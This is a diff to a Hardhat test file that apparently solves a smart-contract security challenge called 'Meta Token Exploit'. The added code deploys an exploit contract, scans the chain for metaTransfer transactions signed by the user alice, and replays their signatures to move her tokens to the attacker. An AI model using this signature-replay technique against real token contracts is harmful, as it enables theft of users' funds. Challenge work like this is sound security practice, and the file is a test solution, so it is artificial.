@@ -55,6 +55,41 @@ describe('[META TOKEN EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let exploit = await (await ethers.getContractFactory('MetaTokenExploit', deployer)).deploy(this.token.address)
+
+        const iface = new ethers.utils.Interface(['function metaTransfer(address sender, address receiver, uint256 amount, uint256 v, uint256 r, uint256 s)'])
+
+        const provider = attacker.provider
+
+        let done = false;
+
+        // iterate over latest blocks
+        for(let blockNumber = 0; blockNumber < (await provider.getBlockNumber()); blockNumber++) {
+        
+            // get transactions hash
+            let transactions = (await provider.getBlock(blockNumber)).transactions
+            
+            for(const txHash of transactions) {
+
+                try {
+                    // get the tx data ...
+                    let txData = (await provider.getTransaction(txHash)).data
+                    
+                    // ... and try to decode it
+                    let {sender, receiver, amount, v, r, s} = iface.decodeFunctionData('metaTransfer', txData)
+
+                    expect(sender).to.be.equal(alice.address)
+                    expect(receiver).to.be.equal(attacker.address)
+                    
+                    await exploit.connect(attacker).run(sender, attacker.address, amount, v, r, s);
+                    done = true;
+
+                } catch {}
+            }
+
+            if(done) break
+        }
+
     })
 
     after(async function () {
